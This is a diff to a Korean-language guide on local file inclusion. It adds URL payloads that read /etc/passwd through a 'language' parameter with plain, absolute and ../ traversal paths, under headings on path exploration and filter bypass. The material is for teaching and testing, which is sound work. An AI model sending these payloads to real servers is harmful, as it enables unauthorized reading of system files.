@@ -267,9 +267,11 @@ C:\Windows\System32\drivers\etc\hosts  # hosts 파일
 
 ```bash
 # 기본 경로 탐색
+http://<SERVER_IP>:<PORT>/index.php?language=etc/passwd
 http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
 
 # 절대 경로 시도
+http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
 http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
 
 # 필터 우회 - 점과 슬래시 조합
